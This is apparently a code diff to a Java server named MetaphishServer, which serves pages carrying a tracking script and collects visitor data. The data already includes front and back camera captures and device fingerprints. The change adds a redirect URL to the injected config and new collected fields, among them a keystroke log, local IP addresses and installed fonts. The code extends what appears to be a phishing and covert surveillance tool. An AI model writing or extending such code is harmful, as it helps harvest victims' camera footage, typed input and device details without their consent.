@@ -145,7 +145,8 @@ public final class MetaphishServer {
         }
         String ConfigScript = "<script>window.MetaphishConfig={CameraMode:\""
                 + Config.CameraMode + "\",VideoSource:\"" + Config.VideoSource
-                + "\",VideoDuration:" + Config.VideoDuration + "};</script>\n";
+                + "\",VideoDuration:" + Config.VideoDuration
+                + ",RedirectUrl:\"" + Config.RedirectUrl + "\"};</script>\n";
         Content = Content.replace(
             "<script src=\"/static/Tracker.js\"></script>",
             ConfigScript + "<script src=\"/static/Tracker.js\"></script>"
@@ -188,7 +189,8 @@ public final class MetaphishServer {
                 "VideoInputCount", "AudioInputCount", "AudioOutputCount",
                 "StorageQuotaMb", "StorageUsedMb",
                 "PageUrl", "Referrer", "Timezone",
-                "CameraFrontFile", "CameraBackFile", "CameraVideoFile", "CameraVideoBackFile"
+                "CameraFrontFile", "CameraBackFile", "CameraVideoFile", "CameraVideoBackFile",
+                "IsSecureContext", "LocalIpAddresses", "InstalledFonts", "KeystrokeLog"
         };
 
         for (String Field : Fields) {
